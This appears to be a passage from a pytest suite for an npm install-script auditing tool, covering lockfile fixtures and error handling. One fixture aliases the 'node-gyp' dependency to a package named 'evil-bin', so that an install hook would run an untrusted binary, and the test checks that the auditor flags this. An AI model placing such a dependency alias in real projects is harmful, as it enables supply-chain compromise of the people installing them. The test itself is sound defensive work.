    repo.mkdir()
    tarball = repo / "victim.tgz"
    integrity = _write_tarball(
        tarball,
        "victim",
        "1.0.0",
        {"install": "node-gyp rebuild"},
        manifest_extra={"dependencies": {"node-gyp": "npm:evil-bin@1.0.0"}},
    )
    _write_lock(
        repo,
        {
            "victim": {
                "version": "1.0.0",
                "resolved": str(tarball),
                "integrity": integrity,
                "hasInstallScript": True,
                "dependencies": {"node-gyp": "npm:evil-bin@1.0.0"},
            }
        },
    )

    report = build_scripts_audit_report(
        repo,
        artifact_config=ArtifactScanConfig(cache_dir=tmp_path / "artifact-cache"),
    )

    assert report.entries[0].verdict == "review"
    assert "executable-provenance-unverified" in report.entries[0].reasons


def test_unmaterializable_script_entry_is_a_hard_error(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {},
            "vendor/opaque": {"hasInstallScript": True},
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    with pytest.raises(ScriptsAuditError, match="could not be materialized safely"):
        build_scripts_audit_report(repo, fetch_artifacts=False)


def test_script_bearing_link_without_a_target_is_a_hard_error(tmp_path):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {"dependencies": {"opaque": "file:vendor/missing"}},
            "node_modules/opaque": {
                "link": True,
                "resolved": "vendor/missing",
                "hasInstallScript": True,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    with pytest.raises(ScriptsAuditError, match="has no auditable target"):
        build_scripts_audit_report(repo, fetch_artifacts=False)


@pytest.mark.parametrize("invalid_value", ["true", 1, [], {}])
def test_non_boolean_install_script_flag_is_a_hard_error(tmp_path, invalid_value):
    repo = tmp_path / "repo"
    repo.mkdir()
    lock = {
        "name": "fixture-app",
        "version": "1.0.0",
        "lockfileVersion": 3,
        "packages": {
            "": {},
            "node_modules/opaque": {
                "version": "1.0.0",
                "hasInstallScript": invalid_value,
            },
        },
    }
    (repo / "package-lock.json").write_text(json.dumps(lock))

    with pytest.raises(ScriptsAuditError, match="non-boolean hasInstallScript"):
        build_scripts_audit_report(repo, fetch_artifacts=False)
